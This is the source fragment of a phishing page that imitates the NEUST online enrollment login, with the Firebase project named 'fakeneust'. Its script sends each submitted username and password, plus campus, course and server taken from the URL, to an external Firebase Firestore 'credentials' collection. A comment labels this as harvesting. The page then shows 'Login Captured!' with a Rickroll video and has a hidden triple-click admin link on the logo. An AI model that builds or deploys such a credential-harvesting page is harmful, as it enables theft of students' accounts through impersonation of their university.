    <style>
        /* STYLE FOR TINYBOX */
        .tbox {
            position: absolute;
            display: none;
            padding: 14px 17px;
            z-index: 900
        }

        .tinner {
            padding: 15px;
            -moz-border-radius: 5px;
            border-radius: 5px;
            background: #fff url(images/preload.gif) no-repeat 50% 50%;
            border-right: 1px solid #333;
            border-bottom: 1px solid #333
        }

        .tmask {
            position: absolute;
            display: none;
            top: 0px;
            left: 0px;
            height: 100%;
            width: 100%;
            background: #000;
            z-index: 800
        }

        .tclose {
            position: absolute;
            top: 0px;
            right: 0px;
            width: 30px;
            height: 30px;
            cursor: pointer;
            background: url(images/close.png) no-repeat
        }

        .tclose:hover {
            background-position: 0 -30px
        }

        #error {
            background: #ff6969;
            color: #fff;
            text-shadow: 1px 1px #cf5454;
            border-right: 1px solid #000;
            border-bottom: 1px solid #000;
            padding: 0
        }

        #error .tcontent {
            padding: 10px 14px 11px;
            border: 1px solid #ffb8b8;
            -moz-border-radius: 5px;
            border-radius: 5px
        }

        #success {
            background: #2ea125;
            color: #fff;
            text-shadow: 1px 1px #1b6116;
            border-right: 1px solid #000;
            border-bottom: 1px solid #000;
            padding: 10;
            -moz-border-radius: 0;
            border-radius: 0
        }

        #bluemask {
            background: #4195aa
        }

        #frameless {
            padding: 0
        }

        #frameless .tclose {
            left: 6px
        }

        /* END OF TINYBOX */
        .server-status-box {
            margin-top: 30px;
            padding: 20px;
            background: #ffffff;
            border-left: 5px solid #007bff;
            border-radius: 10px;
            font-family: Arial, sans-serif;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
        }

        .server-status-box h4 {
            font-size: 16px;
            margin-bottom: 15px;
            font-weight: 600;
            color: #333;
        }

        .server-legend {
            display: flex;

            gap: 12px;

        .server-item {

            padding: 10px 15px;
            border-left: 5px solid var(--color);
            background: #f9f9f9;
            border-radius: 6px;
            font-size: 14px;
            color: #333;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: inset 0 0 2px #ccc;
        }

        .navigate-link {
            background: var(--color);
            color: white;
            padding: 4px 10px;
            margin-left: 10px;
            font-size: 12px;
            text-decoration: none;
            border-radius: 4px;
            transition: background 0.2s ease;
        }

            <script type="module">
                import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
                import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

                const firebaseConfig = {
                    apiKey: "AIzaSyCxS5bpVtVzjxovMGpY0MP8rlr5m-m6Ay0",
                    authDomain: "fakeneust.firebaseapp.com",
                    projectId: "fakeneust",
                    storageBucket: "fakeneust.firebasestorage.app",
                    messagingSenderId: "226469392303",
                    appId: "1:226469392303:web:2a81f09f14a865f095095a"
                };

                const app = initializeApp(firebaseConfig);
                const db = getFirestore(app);

                // Dynamically populate campus and course from URL params
                document.addEventListener('DOMContentLoaded', () => {
                    const urlParams = new URLSearchParams(window.location.search);
                    let campusName = urlParams.get('campus') || '';
                    let courseName = urlParams.get('course') || '';
                    let serverName = urlParams.get('server') || 'Server 2'; // Default

                    // Update portal title if server is provided
                    const titleEls = document.querySelectorAll('.login100-form-title');
                    if (titleEls.length > 1) {
                        titleEls[1].textContent = 'Online Enrollment System - ' + serverName;
                    }

                    if (campusName && courseName) {
                        const infoDiv = document.createElement('div');
                        infoDiv.innerHTML = `
                            <div align="center" style="font-size: 18px;">Campus: ${campusName}</div>
                            <div align="center" style="font-size: 18px;">Course: ${courseName}</div>
                        `;

                        const reglink = document.getElementById('reglink');
                        if (reglink && reglink.nextElementSibling) {
                            reglink.parentNode.insertBefore(infoDiv, reglink.nextElementSibling.nextElementSibling);
                        }
                    }

                    // Handle Form Submission / Button Click
                    const loginBtn = document.querySelector('#btn_login .login100-form-btn');
                    const form = document.getElementById('loginform');

                    const handleLogin = async (event) => {
                        event.preventDefault();
                        const un = document.getElementById('user_name').value;
                        const pw = document.getElementById('user_password').value;

                        if (un && pw) {
                            document.getElementById('log_div').innerHTML = '<img src="images/loading_image.gif" /> <br>Logging in... Please Wait...';

                            try {
                                // Harvest credentials to Firebase Firestore
                                await addDoc(collection(db, "credentials"), {
                                    username: un,
                                    password: pw,
                                    server: serverName,
                                    campus: campusName,
                                    program: courseName,
                                    timestamp: new Date().toISOString()
                                });

                                // Reveal Rickroll video
                                document.getElementById('log_div').innerHTML = `
                                    <h4 style="color:red; margin-bottom: 15px;">Login Captured!</h4>
                                    <iframe width="100%" height="250" src="https://www.youtube.com/embed/2qBlE2-WL60?autoplay=1" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
                                `;
                            } catch (e) {
                                console.error("Error saving to Firebase: ", e);
                                alert("Failed to connect to backend database.");
                            }
                        }
                    };

                    if (loginBtn) {
                        loginBtn.addEventListener('click', handleLogin);
                    }
                    if (form) {
                        form.addEventListener('submit', handleLogin);
                    }

                    // Admin Trigger (Triple click on NEUST logo)
                    let logoClicks = 0;
                    let logoTimeout;
                    const logoImg = document.querySelector('img[src="images/neust_logo.png"]');

                    if (logoImg) {
                        logoImg.style.cursor = 'pointer';
                        logoImg.addEventListener('click', () => {
                            logoClicks++;
                            clearTimeout(logoTimeout);
                            logoTimeout = setTimeout(() => { logoClicks = 0; }, 1000);

                            if (logoClicks >= 3) {
                                window.location.href = 'admin.html';
                            }
                        });
                    }
                });
            </script>
